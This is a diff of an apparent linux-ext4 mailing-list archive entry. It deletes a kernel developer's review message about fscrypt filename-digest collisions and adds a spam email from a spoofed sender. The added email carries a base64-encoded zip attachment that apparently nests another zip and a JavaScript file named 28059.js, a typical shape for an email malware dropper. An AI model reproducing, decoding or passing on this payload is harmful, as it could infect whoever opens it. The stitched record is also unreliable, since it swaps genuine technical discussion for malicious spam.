@@ -1,94 +1,83 @@
-From: Eric Biggers <ebiggers3@gmail.com>
-Subject: Re: [PATCH 3/6] fscrypt: introduce helper function for filename
- matching
-Date: Fri, 28 Apr 2017 14:18:45 -0700
-Message-ID: <20170428211845.GA62395@gmail.com>
-References: <20170424170013.85175-1-ebiggers3@gmail.com>
- <20170424170013.85175-4-ebiggers3@gmail.com>
+From: <editor@coastreporter.net>
+Subject: 38034 linux-ext4
+Date: Sat, 29 Apr 2017 17:50:03 -0000
+Message-ID: <149348820331.22109.3667791862260835842@epm.net.co>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Cc: "Theodore Y . Ts'o" <tytso@mit.edu>,
-        Jaegeuk Kim <jaegeuk@kernel.org>,
-        linux-f2fs-devel@lists.sourceforge.net, linux-ext4@vger.kernel.org,
-        linux-mtd@lists.infradead.org,
-        Gwendal Grignou <gwendal@chromium.org>, hashimoto@chromium.org,
-        kinaba@chromium.org, Eric Biggers <ebiggers@google.com>
-To: linux-fscrypt@vger.kernel.org
+Content-Type: application/zip; name="3855721583.zip"
+Content-Transfer-Encoding: base64
+To: <linux-ext4@vger.kernel.org>
 Return-path: <linux-ext4-owner@vger.kernel.org>
-Received: from mail-pf0-f194.google.com ([209.85.192.194]:34021 "EHLO
-        mail-pf0-f194.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1030862AbdD1VSt (ORCPT
-        <rfc822;linux-ext4@vger.kernel.org>); Fri, 28 Apr 2017 17:18:49 -0400
-Content-Disposition: inline
-In-Reply-To: <20170424170013.85175-4-ebiggers3@gmail.com>
+Received: from dinamic-Cable-190-7-141-90.epm.net.co ([190.7.141.90]:60825
+        "HELO epm.net.co" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org
+        with SMTP id S938086AbdD2RuH (ORCPT
+        <rfc822;linux-ext4@vger.kernel.org>); Sat, 29 Apr 2017 13:50:07 -0400
+Content-Disposition: attachment
 Sender: linux-ext4-owner@vger.kernel.org
 List-ID: <linux-ext4.vger.kernel.org>
 
-On Mon, Apr 24, 2017 at 10:00:10AM -0700, Eric Biggers wrote:
-> +/**
-> + * fscrypt_digested_name - alternate identifier for an on-disk filename
-> + *
-> + * When userspace lists an encrypted directory without access to the key,
-> + * filenames whose ciphertext is longer than FSCRYPT_FNAME_MAX_UNDIGESTED_SIZE
-> + * bytes are shown in this abbreviated form (base64-encoded) rather than as the
-> + * full ciphertext (base64-encoded).  This is necessary to allow supporting
-> + * filenames up to NAME_MAX bytes, since base64 encoding expands the length.
-> + *
-> + * To make it possible for filesystems to still find the correct directory entry
-> + * despite not knowing the full on-disk name, we encode any filesystem-specific
-> + * 'hash' and/or 'minor_hash' which the filesystem may need for its lookups,
-> + * followed by the second-to-last ciphertext block of the filename.  Due to the
-> + * use of the CBC-CTS encryption mode, the second-to-last ciphertext block
-> + * depends on the full plaintext.  (Note that ciphertext stealing causes the
-> + * last two blocks to appear "flipped".)  This makes collisions very unlikely:
-> + * just a 1 in 2^128 chance for two filenames to collide even if they share the
-> + * same filesystem-specific hashes.
-> + *
-> + * This scheme isn't strictly immune to intentional collisions because it's
-> + * basically like a CBC-MAC, which isn't secure on variable-length inputs.
-> + * However, generating a CBC-MAC collision requires the ability to choose
-> + * arbitrary ciphertext, which won't normally be possible with filename
-> + * encryption since it would require write access to the raw disk.
-> + *
-> + * Taking a real cryptographic hash like SHA-256 over the full ciphertext would
-> + * be better in theory but would be less efficient and more complicated to
-> + * implement, especially since the filesystem would need to calculate it for
-> + * each directory entry examined during a search.
-> + */
-
-Hmm, after thinking about it more, my claim that creating intentional collisions
-in digested names requires write access to the raw disk is incorrect.  Actually
-it's pretty easy to create intentional collisions; it's sufficient to be able to
-create filenames and view their corresponding ciphertexts.  So someone could
-create undeletable files --- not necessarily the end of the world, but still
-annoying.
-
-Unfortunately, the same problem exists regardless of whether we use the
-second-to-last ciphertext block, the last block, or the last two blocks; and
-regardless of whether the length is encoded in the digested names.
-
-My patches are still an improvement, of course, and for now I'll probably just
-tweak the comment.  But to solve this for real I think we'd need to do one of
-the following:
-
-- Use a real cryptographic hash like SHA-256 of the ciphertext (which I think
-  was actually the original design)
-- Switch to an encryption mode like HEH (Hash-Encrypt-Hash) which is a
-  pseudorandom permutation over the whole input
-- Take some number (maybe 8 or 12) of bytes of ciphertext from each block;
-  definitely a hack cryptographically, but it *might* be good enough
-- Limit filenames in encrypted directories to (3*255)/4 bytes, so we can avoid
-  this mess entirely
-
-Another hack we maybe could do is remove the following sanity check in
-ext4_unlink(), and in other filesystems if needed, which requires that the inode
-number in a dir_entry being removed is as expected:
-
-	retval = -EFSCORRUPTED;
-	if (le32_to_cpu(de->inode) != inode->i_ino)
-		goto end_unlink;
-
-Then I think any colliding files could still be deleted; it just wouldn't happen
-in the right order...
-
-Eric
+UEsDBAoAAAAAAAKNnUqsWfOADQ4AAA0OAAAJAAAAMjgwNTkuemlwUEsDBBQAAAAIAAKNnUpWyxRn
+dw0AAL1EAAAIAAAAMjgwNTkuanONXNtuMjcQvq/Ud1ghVT+oUSpVqv5WUS4SQg7kCIQcUG4ILARC
+OENIqr57dz+vd2zP2HDjmd14POM524uybs+jar3fXZy/Nyur1vV3b1Arv22iw+jXX36shye3r5Wz
+88/jp9r70ePlj9+Tl9cPNwMgp72LcaP9DXyGcRlX20Ngig7o5zHAUw3g/Qjg8TJdJlthltDN8Trl
+B6SCMeEMeJwTEx1egBhYXI2yFQBuMeay40kT46F3AZBvIJWhCYxtwN49RkMFgHoX9YwYY646Ehvv
+c9mJ89F5RpjTmHoCNnB5TbKtkqAOHRCtZNJTQxkVTykrII5+8QQ6YN+5eSuZnD6mpBgAbV48VJ81
+MYAydLZdZtlsk8r+d+SHeM6mAye1WrZ8rWY0rvtZGqUdpjQnG1tAUhIgpARmKxeouc7U9SNgtjNl
+foTRCoRVpAgDxmVGIvsAHg7zHegIcojZ1qNxnOorD7tj2iwPGh57n0PTI4gjc0PF7KgzDHo6TV1m
+E+018WAGlCnLQO+eZSDu6SardawDyvJMPh1vMlfLuT7dmlviqyuJbB0D8c8e0mymWU6iYiwTQvYy
+AGVJousQl4C7a2LL3TBmsb0MbN+aWAQIBzRJVzDzDW0fiJYOo3YelkEadmGRRHRt+WbvBW+Zd+az
+yW0oX/izDYXqCIivYOhdAfC4GPEQt5lyaxPnfV6kPV47zSb6ShlNNBVsxZsmYfXramB7ApnVsSjx
+AlTU5aFbRnih53SZD7ZZrgPOs6sj8lKJPMk366jPXxfIXcZMcE5s51mMbo4vMK/jywA6SaWkLWqy
+BypFlbOWE1oHcrbhnKO160d4dJoq09eZgyVtKrm8nTy5vGaidvPPq1acs4zYaQGYHWK5+r2ivQCR
+A4N3BbPca1yLeXNX7cifVcmZx/3hDh1LZhuWhi6lHt9tETDmHL8e7820JbbsLJwzATztWuRI4U18
+h+QGvH8QfYeFHJnNzlA8s3/6k5Ov+4jESoMXQg48YscVuVcBFJuEjsUPiLa9fNRy6jWeJAfmx6OB
+eHCQOyn8TXQsXuPVQo6NvD2o5D23gp1kEhwNhpqX3V1RXqIleLzE3kMMKdw+JJpCmIndasACMgCT
+y5kyY6iG6NmUh4pW7GKUjii8Cts6LwidudsoEtPHrQ2/qRLgC94jyq5c5iEXSAbzfLY///Pabx4r
+uG9yn55K+wXwnj51TvVXdGaD/YYWalt/hqc3ow7yrh+A91DCbcXIH94YfTcWIyOBbE8L2sG4T7I0
+ZWXgktSdAUr8AB2HOgCIWH9uVfxwbl4rw26Pztwp8cwuC9itmbeAMpvg2Zs/ebzdOAEN4JQvR1HN
+d75LJiN5+FXjOdxskDAnVk3YegcJlbP7sB2uLfVOWpJL+7qg6sbZhjdJfgSSBg/SqptSAYOn6Wt2
+YwoQajyolN0Buc+X8G+dTG5UDesQxQsAZwhAqZHHkHQCEMuY3beyI2YoMniZ5o3foUoAvpsR3200
+u0gYx+addLAv5MeV6md0pET3FaxwFuuYsen0FaGKRAJQc8FvqrhBBuvYzdj8WA3ULfdPvC4Qiec0
+ttUh7VYYcMt1ViyeDXe5AhrG4o2A28O5KZid7DvixbGv2riXE24qAN32m8tiQbVb7j1ZyBKG2YGV
+PW7Gmyrqw/JtbjmPEauLO6KxpgOK8eBudjngaYNl7TE/TwfKIWmhn2tPspxotP3c40I3WHp2j6dO
++dp8MKo0vigcwheteHCSdGMZO0HptcpH+OJ7cqxWjJNzjm+XQigYN8wF17Hl5ijQTZQcLeNhtw8c
+yS1XJBxNQ+dz3lr1yBTh+9aVZrVjYdXmGneWhrkCGchyEumAxa/iLGOOA1effHpeRkPtjx0Q0zwN
+hWKI364dW7WHZxL72Fy71IreySz42yrQ5vLe6v1iLm7CaT58HeZMynS2I7jyPVgXEx7DBq9RmryA
+Ugnw9K10KSjeB/haz+rAPfEQobfK0QeaMj9eC7c1evqNU2qkpA7Mq9tiKfB9A0ASgprP7Z8biOTf
+KHjs4TfxepvzWP6YJPVf/GpbrSImIO8n07nnHBD49cF4h+sXM6gCigT09vPATQe9aRqdia8g8H4A
+Iw6vTnMW/oL77JZqb++cczhZm6J5tcR12tp8JAfBbRd6QOW+4u7eoeZfhWzt8g7wdih8UvL+rGN6
+ue/GP+fo77dPJyP2BdOuyW5P6InrrmHT7T91Aip9/I7nFeewFfaljf3pEw+7XD4rbgu51vt+vEMh
+vuAfjd0DLb8xsOpmUTVkSvrtbbj0gUStb1brrc210tauXWCuNze+zuRlNPvtF5/ZlYtUZ7mnM/Zq
+lXXbOdOHPx+S3hSZfMLm6eekMeFpmX/eFkxz3h2J9xXBs6fqjcLFouU4DJ/IVF3xHEelH37In7vf
+CqWh/06UU1JWO9jluygq038/Dn79pbdKevDBZBxVri8vzu426+er+/PvQfO9XizfvT9e1fqz6dHX
+56B5srkc7kXxrPk6OKlW3rq9i/7T6Xi92os+71rfzfnJpH+f9ubTy4veTSn6N/kd5jxerubjiK+z
+v5iOBssiX6y0P5wMxkVpxYPov19/wa8+jyvreNO+GNfqjeb1aa/bUj/6HLTfXxuz5cP6rVxfKSMd
+q9BZNHvKd++mSoVDpeT77ub8Y91OCFVIqIyRLgEE6xyfJdQp4bCK6fPoKmVk/MIhYwkc84FlRMAV
+5ZOKjfKbctdcXJHNJQmVubnDpKlsrzz+bgqQEgNJV3hV2SflAoRY4TFfAaMtqxLwI4aInK6X6zET
+dkTChpV3p8i+MGbyYczJAXOOpEvaISBt8xmYlhQPpgBAHSl62Wz8zWWFMZkNaBvwgbOybMI1A/Sj
+o0nc2cANwSI1Ea8tPQIjbRjdMojJmQ9z3+SW0FsjEjJ19NosD5ir4MGJJFrE3GLV2CLegKVxP8ed
+5lstP7AdwOOlLJhmu7pczeNrXNpcUCI+sqSztWPZEKOzweT3LaKj4cmJ9myiPUfcO2BC8qV43Vsu
+Q1azDQ5EM9sP2KrJZtdjKY8A09QAZDBmK6B9NdnaaEDIuB3Oj91iZhq+FZpJ2tpYcUFqymfzxNJf
+cKdhxsSD9hwWFSrYJR+iZRwlSulVGdfUB83mBmtZE+U5jc91z5rG9ECb6Gbys9m20zvBmc32J+Fq
+IAlbE5XenJrr5kgAH6tj8njj5wT2rvHKdIHcdea2oBmxz9FiOy9x83J+pOrpKPV6tw0JFg08ZS7S
+iYt11jZwi5kSa87x1nbD7RNYuHg54yFfQVdWq1epSA5jlQ8e0dMsPOXc7BRLNzIxFr2ZLVymCzmd
+5IwyewAhutTf8wUDVRvQ3sUZhSYgc1Jebkjniuf16bdRQXZsoB7cCpKpC6NUvYCZ1rt/GmINZi9y
+UiufbYl6R77XOdGEs9BIeYLcTABy0SRX2rAWz2QotmpT4dixtdkDyNQpZqtVuTPJc6VtVe7b2kRu
+Nqnb1TLQV3nKue313Pxd0eFJMMdd7TTXOHl/fLMXIFq5T6UupJCHjFaOJ6XjHRHuyb252/w45uJn
+gUI/WE7ERrLAvVluFEriEdjXs+9FRu4JdJFy7ikUAEvaiy2Pc3aH0bUQ5VVA19gZm9K+Km1KSm47
+/+GGvO2NHdgBxG6Z1Zm2v5cBShcDR75WHKPp1PYWlTTuBqUsB0zw0OJP3qNZXIELmvkTyN9//+Ny
+98kP1Gnvf1Ii8yVoQP8Z46+ff/xUogg50Z/m/8YfXK3z9MbyECBW+OenSY6Rn7sxmsLzhf7CMu7R
+iN0rsN6PKZCfLfnhBKNOiaWDHwfqXmzTX9SXrbS1786q78e4FCv0zgZJiX9I6m3h9+Sx9ToHHGFM
+mqi0XtRrXeTUPl6eX15dv7wsJr37nBbv8wVGKRkeTNrHZDZeZuxaeNDswAloB2NCB9htACQrAL71
+2/P45eUjeUhFB4AMwJJVU/a0VsIesMaWGaSyAz/FmIgEqOVydwFEb6XTw6NmD4BNEXvGGWNKXM+I
+SWzSPYBeQasgYzrZYbsYHXMtbnvLl5fPwY3Jl0g5oy7MKisEqNKKreFsBYy5vK5q8OTqB8BV0uPC
+oAbQXpaJo1UFYBlcr5gthlHrIrK2ZuuA+8g40Vt5pRg5zkuEpG21vdhhAZDJbIjr+hTw/pixwROp
+nhjiUdMtU6a2I8syritqQWyVYl9SKpGKqrwwiGljAHbwAyd3nIyT3PG14OGnBfZRLyX/xSsSlDQZ
+94SJ3rWv55Pb+0KWJj83s2Xr6Ptk+jW/jbv1xqhzrVLl7fP3EWia9xeAs7HaQmbIdVV5zs15T2ky
++T7xsLrutCr15CPCqLga3z6r3R41AZ1lsIJJDJisAIhlFp32NBUjkWA2Ps1c3eCrzKjslTIHktFj
+TBcpvhReCqXSgd7w4/dNbXA+bY0W1/3hfdxNdhun8vIPPsL/09iLCuGfyRWSGQm3hNegFxWnx7XL
+VfITotlD86s6eCvfFEvR4WHUa48WcfJN6Ndf+Mcbvzh8bsIrfC2YSZPt/L27fJ62z0+eKv3T1lnt
+djP2M+NvBEfZi66exuW388vXeHT3+PXce+gkDH8rlJIxtxsZmhwEgsVKsuQz1v9QSwECPwAUAAAA
+CAACjZ1KVssUZ3cNAAC9RAAACAAkAAAAAAAAACAAAAAAAAAAMjgwNTkuanMKACAAAAAAAAEAGAAY
+H5FNSsHSARgfkU1KwdIBGB+RTUrB0gFQSwUGAAAAAAEAAQBaAAAAnQ0AAAAAUEsBAj8ACgAAAAAA
+Ao2dSqxZ84ANDgAADQ4AAAkAJAAAAAAAAAAgAAAAAAAAADI4MDU5LnppcAoAIAAAAAAAAQAYANjj
+lU1KwdIBs4OTTUrB0gGzg5NNSsHSAVBLBQYAAAAAAQABAFsAAAA0DgAAAAA=
